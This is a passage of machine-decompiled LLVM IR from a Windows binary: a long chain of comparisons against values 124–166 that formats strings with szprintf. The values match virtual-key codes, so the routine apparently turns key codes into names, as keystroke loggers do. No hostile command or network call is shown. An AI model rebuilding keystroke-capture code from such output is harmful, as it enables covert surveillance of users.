  %v4_10005bf0 = zext i8 %v3_10005bf0 to i32
  %v4_10005c20 = call i32 @szprintf(i32 %v2_10005bdc, i32 ptrtoint ([12 x i8]* @global_var_10015d68.174 to i32), i32 %v4_10005bf0)
  br label %dec_label_pc_10005c24

dec_label_pc_10005c24:                            ; preds = %dec_label_pc_10005bd0, %dec_label_pc_10005bdc
  %v3_10005c28 = icmp eq i32 %v2_10003364, 124
  br i1 %v3_10005c28, label %dec_label_pc_10005c30, label %dec_label_pc_10005c78

dec_label_pc_10005c30:                            ; preds = %dec_label_pc_10005c24
  %v2_10005c30 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005c44 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10005c44 = zext i8 %v3_10005c44 to i32
  %v4_10005c74 = call i32 @szprintf(i32 %v2_10005c30, i32 ptrtoint ([14 x i8]* @global_var_10015d74.175 to i32), i32 %v4_10005c44)
  br label %dec_label_pc_10005c78

dec_label_pc_10005c78:                            ; preds = %dec_label_pc_10005c24, %dec_label_pc_10005c30
  %v3_10005c7c = icmp eq i32 %v2_10003364, 125
  br i1 %v3_10005c7c, label %dec_label_pc_10005c84, label %dec_label_pc_10005ccc

dec_label_pc_10005c84:                            ; preds = %dec_label_pc_10005c78
  %v2_10005c84 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005c98 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10005c98 = zext i8 %v3_10005c98 to i32
  %v4_10005cc8 = call i32 @szprintf(i32 %v2_10005c84, i32 ptrtoint ([14 x i8]* @global_var_10015d84.176 to i32), i32 %v4_10005c98)
  br label %dec_label_pc_10005ccc

dec_label_pc_10005ccc:                            ; preds = %dec_label_pc_10005c78, %dec_label_pc_10005c84
  %v3_10005cd0 = icmp eq i32 %v2_10003364, 126
  br i1 %v3_10005cd0, label %dec_label_pc_10005cd8, label %dec_label_pc_10005d20

dec_label_pc_10005cd8:                            ; preds = %dec_label_pc_10005ccc
  %v2_10005cd8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005cec = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10005cec = zext i8 %v3_10005cec to i32
  %v4_10005d1c = call i32 @szprintf(i32 %v2_10005cd8, i32 ptrtoint ([14 x i8]* @global_var_10015d74.175 to i32), i32 %v4_10005cec)
  br label %dec_label_pc_10005d20

dec_label_pc_10005d20:                            ; preds = %dec_label_pc_10005ccc, %dec_label_pc_10005cd8
  %v3_10005d24 = icmp eq i32 %v2_10003364, 127
  br i1 %v3_10005d24, label %dec_label_pc_10005d2c, label %dec_label_pc_10005d74

dec_label_pc_10005d2c:                            ; preds = %dec_label_pc_10005d20
  %v2_10005d2c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005d40 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10005d40 = zext i8 %v3_10005d40 to i32
  %v4_10005d70 = call i32 @szprintf(i32 %v2_10005d2c, i32 ptrtoint ([14 x i8]* @global_var_10015d94.177 to i32), i32 %v4_10005d40)
  br label %dec_label_pc_10005d74

dec_label_pc_10005d74:                            ; preds = %dec_label_pc_10005d20, %dec_label_pc_10005d2c
  %v3_10005d78 = icmp eq i32 %v2_10003364, 128
  br i1 %v3_10005d78, label %dec_label_pc_10005d80, label %dec_label_pc_10005dc8

dec_label_pc_10005d80:                            ; preds = %dec_label_pc_10005d74
  %v2_10005d80 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005d94 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10005d94 = zext i8 %v3_10005d94 to i32
  %v4_10005dc4 = call i32 @szprintf(i32 %v2_10005d80, i32 ptrtoint ([14 x i8]* @global_var_10015da4.178 to i32), i32 %v4_10005d94)
  br label %dec_label_pc_10005dc8

dec_label_pc_10005dc8:                            ; preds = %dec_label_pc_10005d74, %dec_label_pc_10005d80
  %v3_10005dcc = icmp eq i32 %v2_10003364, 129
  br i1 %v3_10005dcc, label %dec_label_pc_10005dd4, label %dec_label_pc_10005e1c

dec_label_pc_10005dd4:                            ; preds = %dec_label_pc_10005dc8
  %v2_10005dd4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005de8 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10005de8 = zext i8 %v3_10005de8 to i32
  %v4_10005e18 = call i32 @szprintf(i32 %v2_10005dd4, i32 ptrtoint ([14 x i8]* @global_var_10015db4.179 to i32), i32 %v4_10005de8)
  br label %dec_label_pc_10005e1c

dec_label_pc_10005e1c:                            ; preds = %dec_label_pc_10005dc8, %dec_label_pc_10005dd4
  %v3_10005e20 = icmp eq i32 %v2_10003364, 130
  br i1 %v3_10005e20, label %dec_label_pc_10005e28, label %dec_label_pc_10005e70

dec_label_pc_10005e28:                            ; preds = %dec_label_pc_10005e1c
  %v2_10005e28 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005e3c = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10005e3c = zext i8 %v3_10005e3c to i32
  %v4_10005e6c = call i32 @szprintf(i32 %v2_10005e28, i32 ptrtoint ([14 x i8]* @global_var_10015dc4.180 to i32), i32 %v4_10005e3c)
  br label %dec_label_pc_10005e70

dec_label_pc_10005e70:                            ; preds = %dec_label_pc_10005e1c, %dec_label_pc_10005e28
  %v3_10005e74 = icmp eq i32 %v2_10003364, 131
  br i1 %v3_10005e74, label %dec_label_pc_10005e7c, label %dec_label_pc_10005ec4

dec_label_pc_10005e7c:                            ; preds = %dec_label_pc_10005e70
  %v2_10005e7c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005e90 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10005e90 = zext i8 %v3_10005e90 to i32
  %v4_10005ec0 = call i32 @szprintf(i32 %v2_10005e7c, i32 ptrtoint ([14 x i8]* @global_var_10015dd4.181 to i32), i32 %v4_10005e90)
  br label %dec_label_pc_10005ec4

dec_label_pc_10005ec4:                            ; preds = %dec_label_pc_10005e70, %dec_label_pc_10005e7c
  %v3_10005ec8 = icmp eq i32 %v2_10003364, 132
  br i1 %v3_10005ec8, label %dec_label_pc_10005ed0, label %dec_label_pc_10005f18

dec_label_pc_10005ed0:                            ; preds = %dec_label_pc_10005ec4
  %v2_10005ed0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005ee4 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10005ee4 = zext i8 %v3_10005ee4 to i32
  %v4_10005f14 = call i32 @szprintf(i32 %v2_10005ed0, i32 ptrtoint ([14 x i8]* @global_var_10015de4.182 to i32), i32 %v4_10005ee4)
  br label %dec_label_pc_10005f18

dec_label_pc_10005f18:                            ; preds = %dec_label_pc_10005ec4, %dec_label_pc_10005ed0
  %v3_10005f1c = icmp eq i32 %v2_10003364, 133
  br i1 %v3_10005f1c, label %dec_label_pc_10005f24, label %dec_label_pc_10005f6c

dec_label_pc_10005f24:                            ; preds = %dec_label_pc_10005f18
  %v2_10005f24 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005f38 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10005f38 = zext i8 %v3_10005f38 to i32
  %v4_10005f68 = call i32 @szprintf(i32 %v2_10005f24, i32 ptrtoint ([14 x i8]* @global_var_10015df4.183 to i32), i32 %v4_10005f38)
  br label %dec_label_pc_10005f6c

dec_label_pc_10005f6c:                            ; preds = %dec_label_pc_10005f18, %dec_label_pc_10005f24
  %v3_10005f70 = icmp eq i32 %v2_10003364, 134
  br i1 %v3_10005f70, label %dec_label_pc_10005f78, label %dec_label_pc_10005fc0

dec_label_pc_10005f78:                            ; preds = %dec_label_pc_10005f6c
  %v2_10005f78 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005f8c = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10005f8c = zext i8 %v3_10005f8c to i32
  %v4_10005fbc = call i32 @szprintf(i32 %v2_10005f78, i32 ptrtoint ([14 x i8]* @global_var_10015e04.184 to i32), i32 %v4_10005f8c)
  br label %dec_label_pc_10005fc0

dec_label_pc_10005fc0:                            ; preds = %dec_label_pc_10005f6c, %dec_label_pc_10005f78
  %v3_10005fc4 = icmp eq i32 %v2_10003364, 135
  br i1 %v3_10005fc4, label %dec_label_pc_10005fcc, label %dec_label_pc_10006014

dec_label_pc_10005fcc:                            ; preds = %dec_label_pc_10005fc0
  %v2_10005fcc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005fe0 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10005fe0 = zext i8 %v3_10005fe0 to i32
  %v4_10006010 = call i32 @szprintf(i32 %v2_10005fcc, i32 ptrtoint ([14 x i8]* @global_var_10015e14.185 to i32), i32 %v4_10005fe0)
  br label %dec_label_pc_10006014

dec_label_pc_10006014:                            ; preds = %dec_label_pc_10005fc0, %dec_label_pc_10005fcc
  %v3_10006018 = icmp eq i32 %v2_10003364, 136
  br i1 %v3_10006018, label %dec_label_pc_10006020, label %dec_label_pc_10006068

dec_label_pc_10006020:                            ; preds = %dec_label_pc_10006014
  %v2_10006020 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006034 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10006034 = zext i8 %v3_10006034 to i32
  %v4_10006064 = call i32 @szprintf(i32 %v2_10006020, i32 ptrtoint ([14 x i8]* @global_var_10015e24.186 to i32), i32 %v4_10006034)
  br label %dec_label_pc_10006068

dec_label_pc_10006068:                            ; preds = %dec_label_pc_10006014, %dec_label_pc_10006020
  %v3_1000606c = icmp eq i32 %v2_10003364, 137
  br i1 %v3_1000606c, label %dec_label_pc_10006074, label %dec_label_pc_100060bc

dec_label_pc_10006074:                            ; preds = %dec_label_pc_10006068
  %v2_10006074 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006088 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10006088 = zext i8 %v3_10006088 to i32
  %v4_100060b8 = call i32 @szprintf(i32 %v2_10006074, i32 ptrtoint ([13 x i8]* @global_var_10015e34.187 to i32), i32 %v4_10006088)
  br label %dec_label_pc_100060bc

dec_label_pc_100060bc:                            ; preds = %dec_label_pc_10006068, %dec_label_pc_10006074
  %v3_100060c0 = icmp eq i32 %v2_10003364, 138
  br i1 %v3_100060c0, label %dec_label_pc_100060c8, label %dec_label_pc_10006110

dec_label_pc_100060c8:                            ; preds = %dec_label_pc_100060bc
  %v2_100060c8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100060dc = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100060dc = zext i8 %v3_100060dc to i32
  %v4_1000610c = call i32 @szprintf(i32 %v2_100060c8, i32 ptrtoint ([13 x i8]* @global_var_10015e44.188 to i32), i32 %v4_100060dc)
  br label %dec_label_pc_10006110

dec_label_pc_10006110:                            ; preds = %dec_label_pc_100060bc, %dec_label_pc_100060c8
  %v3_10006114 = icmp eq i32 %v2_10003364, 139
  br i1 %v3_10006114, label %dec_label_pc_1000611c, label %dec_label_pc_10006164

dec_label_pc_1000611c:                            ; preds = %dec_label_pc_10006110
  %v2_1000611c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006130 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10006130 = zext i8 %v3_10006130 to i32
  %v4_10006160 = call i32 @szprintf(i32 %v2_1000611c, i32 ptrtoint ([13 x i8]* @global_var_10015e54.189 to i32), i32 %v4_10006130)
  br label %dec_label_pc_10006164

dec_label_pc_10006164:                            ; preds = %dec_label_pc_10006110, %dec_label_pc_1000611c
  %v3_10006168 = icmp eq i32 %v2_10003364, 140
  br i1 %v3_10006168, label %dec_label_pc_10006170, label %dec_label_pc_100061b8

dec_label_pc_10006170:                            ; preds = %dec_label_pc_10006164
  %v2_10006170 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006184 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10006184 = zext i8 %v3_10006184 to i32
  %v4_100061b4 = call i32 @szprintf(i32 %v2_10006170, i32 ptrtoint ([13 x i8]* @global_var_10015e64.190 to i32), i32 %v4_10006184)
  br label %dec_label_pc_100061b8

dec_label_pc_100061b8:                            ; preds = %dec_label_pc_10006164, %dec_label_pc_10006170
  %v3_100061bc = icmp eq i32 %v2_10003364, 141
  br i1 %v3_100061bc, label %dec_label_pc_100061c4, label %dec_label_pc_1000620c

dec_label_pc_100061c4:                            ; preds = %dec_label_pc_100061b8
  %v2_100061c4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100061d8 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100061d8 = zext i8 %v3_100061d8 to i32
  %v4_10006208 = call i32 @szprintf(i32 %v2_100061c4, i32 ptrtoint ([13 x i8]* @global_var_10015e74.191 to i32), i32 %v4_100061d8)
  br label %dec_label_pc_1000620c

dec_label_pc_1000620c:                            ; preds = %dec_label_pc_100061b8, %dec_label_pc_100061c4
  %v3_10006210 = icmp eq i32 %v2_10003364, 142
  br i1 %v3_10006210, label %dec_label_pc_10006218, label %dec_label_pc_10006260

dec_label_pc_10006218:                            ; preds = %dec_label_pc_1000620c
  %v2_10006218 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000622c = load i8, i8* @global_var_100287eb.54, align 1
  %v4_1000622c = zext i8 %v3_1000622c to i32
  %v4_1000625c = call i32 @szprintf(i32 %v2_10006218, i32 ptrtoint ([13 x i8]* @global_var_10015e84.192 to i32), i32 %v4_1000622c)
  br label %dec_label_pc_10006260

dec_label_pc_10006260:                            ; preds = %dec_label_pc_1000620c, %dec_label_pc_10006218
  %v3_10006264 = icmp eq i32 %v2_10003364, 143
  br i1 %v3_10006264, label %dec_label_pc_1000626c, label %dec_label_pc_100062b4

dec_label_pc_1000626c:                            ; preds = %dec_label_pc_10006260
  %v2_1000626c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006280 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10006280 = zext i8 %v3_10006280 to i32
  %v4_100062b0 = call i32 @szprintf(i32 %v2_1000626c, i32 ptrtoint ([14 x i8]* @global_var_10015d74.175 to i32), i32 %v4_10006280)
  br label %dec_label_pc_100062b4

dec_label_pc_100062b4:                            ; preds = %dec_label_pc_10006260, %dec_label_pc_1000626c
  %v3_100062b8 = icmp eq i32 %v2_10003364, 144
  br i1 %v3_100062b8, label %dec_label_pc_100062c0, label %dec_label_pc_10006308

dec_label_pc_100062c0:                            ; preds = %dec_label_pc_100062b4
  %v2_100062c0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100062d4 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100062d4 = zext i8 %v3_100062d4 to i32
  %v4_10006304 = call i32 @szprintf(i32 %v2_100062c0, i32 ptrtoint ([14 x i8]* @global_var_10015e94.193 to i32), i32 %v4_100062d4)
  br label %dec_label_pc_10006308

dec_label_pc_10006308:                            ; preds = %dec_label_pc_100062b4, %dec_label_pc_100062c0
  %v3_1000630c = icmp eq i32 %v2_10003364, 145
  br i1 %v3_1000630c, label %dec_label_pc_10006314, label %dec_label_pc_1000635c

dec_label_pc_10006314:                            ; preds = %dec_label_pc_10006308
  %v2_10006314 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006328 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10006328 = zext i8 %v3_10006328 to i32
  %v4_10006358 = call i32 @szprintf(i32 %v2_10006314, i32 ptrtoint ([14 x i8]* @global_var_10015ea4.194 to i32), i32 %v4_10006328)
  br label %dec_label_pc_1000635c

dec_label_pc_1000635c:                            ; preds = %dec_label_pc_10006308, %dec_label_pc_10006314
  %v3_10006360 = icmp eq i32 %v2_10003364, 146
  br i1 %v3_10006360, label %dec_label_pc_10006368, label %dec_label_pc_100063b0

dec_label_pc_10006368:                            ; preds = %dec_label_pc_1000635c
  %v2_10006368 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000637c = load i8, i8* @global_var_100287eb.54, align 1
  %v4_1000637c = zext i8 %v3_1000637c to i32
  %v4_100063ac = call i32 @szprintf(i32 %v2_10006368, i32 ptrtoint ([14 x i8]* @global_var_10015eb4.195 to i32), i32 %v4_1000637c)
  br label %dec_label_pc_100063b0

dec_label_pc_100063b0:                            ; preds = %dec_label_pc_1000635c, %dec_label_pc_10006368
  %v3_100063b4 = icmp eq i32 %v2_10003364, 147
  br i1 %v3_100063b4, label %dec_label_pc_100063bc, label %dec_label_pc_10006404

dec_label_pc_100063bc:                            ; preds = %dec_label_pc_100063b0
  %v2_100063bc = ptrtoint i32* %stack_var_-52 to i32
  %v3_100063d0 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100063d0 = zext i8 %v3_100063d0 to i32
  %v4_10006400 = call i32 @szprintf(i32 %v2_100063bc, i32 ptrtoint ([13 x i8]* @global_var_10015ec4.196 to i32), i32 %v4_100063d0)
  br label %dec_label_pc_10006404

dec_label_pc_10006404:                            ; preds = %dec_label_pc_100063b0, %dec_label_pc_100063bc
  %v3_10006408 = icmp eq i32 %v2_10003364, 148
  br i1 %v3_10006408, label %dec_label_pc_10006410, label %dec_label_pc_10006458

dec_label_pc_10006410:                            ; preds = %dec_label_pc_10006404
  %v2_10006410 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006424 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10006424 = zext i8 %v3_10006424 to i32
  %v4_10006454 = call i32 @szprintf(i32 %v2_10006410, i32 ptrtoint ([13 x i8]* @global_var_10015ed4.197 to i32), i32 %v4_10006424)
  br label %dec_label_pc_10006458

dec_label_pc_10006458:                            ; preds = %dec_label_pc_10006404, %dec_label_pc_10006410
  %v3_1000645c = icmp eq i32 %v2_10003364, 149
  br i1 %v3_1000645c, label %dec_label_pc_10006464, label %dec_label_pc_100064ac

dec_label_pc_10006464:                            ; preds = %dec_label_pc_10006458
  %v2_10006464 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006478 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10006478 = zext i8 %v3_10006478 to i32
  %v4_100064a8 = call i32 @szprintf(i32 %v2_10006464, i32 ptrtoint ([14 x i8]* @global_var_10015ee4.198 to i32), i32 %v4_10006478)
  br label %dec_label_pc_100064ac

dec_label_pc_100064ac:                            ; preds = %dec_label_pc_10006458, %dec_label_pc_10006464
  %v3_100064b0 = icmp eq i32 %v2_10003364, 150
  br i1 %v3_100064b0, label %dec_label_pc_100064b8, label %dec_label_pc_10006500

dec_label_pc_100064b8:                            ; preds = %dec_label_pc_100064ac
  %v2_100064b8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100064cc = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100064cc = zext i8 %v3_100064cc to i32
  %v4_100064fc = call i32 @szprintf(i32 %v2_100064b8, i32 ptrtoint ([14 x i8]* @global_var_10015ef4.199 to i32), i32 %v4_100064cc)
  br label %dec_label_pc_10006500

dec_label_pc_10006500:                            ; preds = %dec_label_pc_100064ac, %dec_label_pc_100064b8
  %v3_10006504 = icmp eq i32 %v2_10003364, 151
  br i1 %v3_10006504, label %dec_label_pc_1000650c, label %dec_label_pc_10006554

dec_label_pc_1000650c:                            ; preds = %dec_label_pc_10006500
  %v2_1000650c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006520 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10006520 = zext i8 %v3_10006520 to i32
  %v4_10006550 = call i32 @szprintf(i32 %v2_1000650c, i32 ptrtoint ([14 x i8]* @global_var_10015f04.200 to i32), i32 %v4_10006520)
  br label %dec_label_pc_10006554

dec_label_pc_10006554:                            ; preds = %dec_label_pc_10006500, %dec_label_pc_1000650c
  %v3_10006558 = icmp eq i32 %v2_10003364, 152
  br i1 %v3_10006558, label %dec_label_pc_10006560, label %dec_label_pc_100065a8

dec_label_pc_10006560:                            ; preds = %dec_label_pc_10006554
  %v2_10006560 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006574 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10006574 = zext i8 %v3_10006574 to i32
  %v4_100065a4 = call i32 @szprintf(i32 %v2_10006560, i32 ptrtoint ([14 x i8]* @global_var_10015ce8.166 to i32), i32 %v4_10006574)
  br label %dec_label_pc_100065a8

dec_label_pc_100065a8:                            ; preds = %dec_label_pc_10006554, %dec_label_pc_10006560
  %v3_100065ac = icmp eq i32 %v2_10003364, 153
  br i1 %v3_100065ac, label %dec_label_pc_100065b4, label %dec_label_pc_100065fc

dec_label_pc_100065b4:                            ; preds = %dec_label_pc_100065a8
  %v2_100065b4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100065c8 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100065c8 = zext i8 %v3_100065c8 to i32
  %v4_100065f8 = call i32 @szprintf(i32 %v2_100065b4, i32 ptrtoint ([13 x i8]* @global_var_10015f14.201 to i32), i32 %v4_100065c8)
  br label %dec_label_pc_100065fc

dec_label_pc_100065fc:                            ; preds = %dec_label_pc_100065a8, %dec_label_pc_100065b4
  %v3_10006600 = icmp eq i32 %v2_10003364, 154
  br i1 %v3_10006600, label %dec_label_pc_10006608, label %dec_label_pc_10006650

dec_label_pc_10006608:                            ; preds = %dec_label_pc_100065fc
  %v2_10006608 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000661c = load i8, i8* @global_var_100287eb.54, align 1
  %v4_1000661c = zext i8 %v3_1000661c to i32
  %v4_1000664c = call i32 @szprintf(i32 %v2_10006608, i32 ptrtoint ([13 x i8]* @global_var_10015f24.202 to i32), i32 %v4_1000661c)
  br label %dec_label_pc_10006650

dec_label_pc_10006650:                            ; preds = %dec_label_pc_100065fc, %dec_label_pc_10006608
  %v3_10006654 = icmp eq i32 %v2_10003364, 155
  br i1 %v3_10006654, label %dec_label_pc_1000665c, label %dec_label_pc_100066a4

dec_label_pc_1000665c:                            ; preds = %dec_label_pc_10006650
  %v2_1000665c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006670 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10006670 = zext i8 %v3_10006670 to i32
  %v4_100066a0 = call i32 @szprintf(i32 %v2_1000665c, i32 ptrtoint ([13 x i8]* @global_var_10015f34.203 to i32), i32 %v4_10006670)
  br label %dec_label_pc_100066a4

dec_label_pc_100066a4:                            ; preds = %dec_label_pc_10006650, %dec_label_pc_1000665c
  %v3_100066a8 = icmp eq i32 %v2_10003364, 156
  br i1 %v3_100066a8, label %dec_label_pc_100066b0, label %dec_label_pc_100066f8

dec_label_pc_100066b0:                            ; preds = %dec_label_pc_100066a4
  %v2_100066b0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100066c4 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100066c4 = zext i8 %v3_100066c4 to i32
  %v4_100066f4 = call i32 @szprintf(i32 %v2_100066b0, i32 ptrtoint ([13 x i8]* @global_var_10015f44.204 to i32), i32 %v4_100066c4)
  br label %dec_label_pc_100066f8

dec_label_pc_100066f8:                            ; preds = %dec_label_pc_100066a4, %dec_label_pc_100066b0
  %v3_100066fc = icmp eq i32 %v2_10003364, 157
  br i1 %v3_100066fc, label %dec_label_pc_10006704, label %dec_label_pc_1000674c

dec_label_pc_10006704:                            ; preds = %dec_label_pc_100066f8
  %v2_10006704 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006718 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10006718 = zext i8 %v3_10006718 to i32
  %v4_10006748 = call i32 @szprintf(i32 %v2_10006704, i32 ptrtoint ([13 x i8]* @global_var_10015f54.205 to i32), i32 %v4_10006718)
  br label %dec_label_pc_1000674c

dec_label_pc_1000674c:                            ; preds = %dec_label_pc_100066f8, %dec_label_pc_10006704
  %v3_10006750 = icmp eq i32 %v2_10003364, 158
  br i1 %v3_10006750, label %dec_label_pc_10006758, label %dec_label_pc_100067a0

dec_label_pc_10006758:                            ; preds = %dec_label_pc_1000674c
  %v2_10006758 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000676c = load i8, i8* @global_var_100287eb.54, align 1
  %v4_1000676c = zext i8 %v3_1000676c to i32
  %v4_1000679c = call i32 @szprintf(i32 %v2_10006758, i32 ptrtoint ([12 x i8]* @global_var_10015f64.206 to i32), i32 %v4_1000676c)
  br label %dec_label_pc_100067a0

dec_label_pc_100067a0:                            ; preds = %dec_label_pc_1000674c, %dec_label_pc_10006758
  %v3_100067a4 = icmp eq i32 %v2_10003364, 159
  br i1 %v3_100067a4, label %dec_label_pc_100067ac, label %dec_label_pc_100067f4

dec_label_pc_100067ac:                            ; preds = %dec_label_pc_100067a0
  %v2_100067ac = ptrtoint i32* %stack_var_-52 to i32
  %v3_100067c0 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100067c0 = zext i8 %v3_100067c0 to i32
  %v4_100067f0 = call i32 @szprintf(i32 %v2_100067ac, i32 ptrtoint ([14 x i8]* @global_var_10015f70.207 to i32), i32 %v4_100067c0)
  br label %dec_label_pc_100067f4

dec_label_pc_100067f4:                            ; preds = %dec_label_pc_100067a0, %dec_label_pc_100067ac
  %v3_100067f8 = icmp eq i32 %v2_10003364, 160
  br i1 %v3_100067f8, label %dec_label_pc_10006800, label %dec_label_pc_10006848

dec_label_pc_10006800:                            ; preds = %dec_label_pc_100067f4
  %v2_10006800 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006814 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10006814 = zext i8 %v3_10006814 to i32
  %v4_10006844 = call i32 @szprintf(i32 %v2_10006800, i32 ptrtoint ([13 x i8]* @global_var_10015f80.208 to i32), i32 %v4_10006814)
  br label %dec_label_pc_10006848

dec_label_pc_10006848:                            ; preds = %dec_label_pc_100067f4, %dec_label_pc_10006800
  %v3_1000684c = icmp eq i32 %v2_10003364, 161
  br i1 %v3_1000684c, label %dec_label_pc_10006854, label %dec_label_pc_1000689c

dec_label_pc_10006854:                            ; preds = %dec_label_pc_10006848
  %v2_10006854 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006868 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10006868 = zext i8 %v3_10006868 to i32
  %v4_10006898 = call i32 @szprintf(i32 %v2_10006854, i32 ptrtoint ([14 x i8]* @global_var_10015f90.209 to i32), i32 %v4_10006868)
  br label %dec_label_pc_1000689c

dec_label_pc_1000689c:                            ; preds = %dec_label_pc_10006848, %dec_label_pc_10006854
  %v3_100068a0 = icmp eq i32 %v2_10003364, 162
  br i1 %v3_100068a0, label %dec_label_pc_100068a8, label %dec_label_pc_100068f0

dec_label_pc_100068a8:                            ; preds = %dec_label_pc_1000689c
  %v2_100068a8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100068bc = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100068bc = zext i8 %v3_100068bc to i32
  %v4_100068ec = call i32 @szprintf(i32 %v2_100068a8, i32 ptrtoint ([14 x i8]* @global_var_10015fa0.210 to i32), i32 %v4_100068bc)
  br label %dec_label_pc_100068f0

dec_label_pc_100068f0:                            ; preds = %dec_label_pc_1000689c, %dec_label_pc_100068a8
  %v3_100068f4 = icmp eq i32 %v2_10003364, 163
  br i1 %v3_100068f4, label %dec_label_pc_100068fc, label %dec_label_pc_10006944

dec_label_pc_100068fc:                            ; preds = %dec_label_pc_100068f0
  %v2_100068fc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006910 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10006910 = zext i8 %v3_10006910 to i32
  %v4_10006940 = call i32 @szprintf(i32 %v2_100068fc, i32 ptrtoint ([14 x i8]* @global_var_10015fb0.211 to i32), i32 %v4_10006910)
  br label %dec_label_pc_10006944

dec_label_pc_10006944:                            ; preds = %dec_label_pc_100068f0, %dec_label_pc_100068fc
  %v3_10006948 = icmp eq i32 %v2_10003364, 164
  br i1 %v3_10006948, label %dec_label_pc_10006950, label %dec_label_pc_10006998

dec_label_pc_10006950:                            ; preds = %dec_label_pc_10006944
  %v2_10006950 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006964 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10006964 = zext i8 %v3_10006964 to i32
  %v4_10006994 = call i32 @szprintf(i32 %v2_10006950, i32 ptrtoint ([14 x i8]* @global_var_10015f04.200 to i32), i32 %v4_10006964)
  br label %dec_label_pc_10006998

dec_label_pc_10006998:                            ; preds = %dec_label_pc_10006944, %dec_label_pc_10006950
  %v3_1000699c = icmp eq i32 %v2_10003364, 165
  br i1 %v3_1000699c, label %dec_label_pc_100069a4, label %dec_label_pc_100069ec

dec_label_pc_100069a4:                            ; preds = %dec_label_pc_10006998
  %v2_100069a4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100069b8 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100069b8 = zext i8 %v3_100069b8 to i32
  %v4_100069e8 = call i32 @szprintf(i32 %v2_100069a4, i32 ptrtoint ([13 x i8]* @global_var_10015fc0.212 to i32), i32 %v4_100069b8)
  br label %dec_label_pc_100069ec

dec_label_pc_100069ec:                            ; preds = %dec_label_pc_10006998, %dec_label_pc_100069a4
  %v3_100069f0 = icmp eq i32 %v2_10003364, 166
  br i1 %v3_100069f0, label %dec_label_pc_100069f8, label %dec_label_pc_10006a40

dec_label_pc_100069f8:                            ; preds = %dec_label_pc_100069ec
  %v2_100069f8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006a0c = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10006a0c = zext i8 %v3_10006a0c to i32
  %v4_10006a3c = call i32 @szprintf(i32 %v2_100069f8, i32 ptrtoint ([14 x i8]* @global_var_10015fd0.213 to i32), i32 %v4_10006a0c)
  br label %dec_label_pc_10006a40

dec_label_pc_10006a40:                            ; preds = %dec_label_pc_100069ec, %dec_label_pc_100069f8
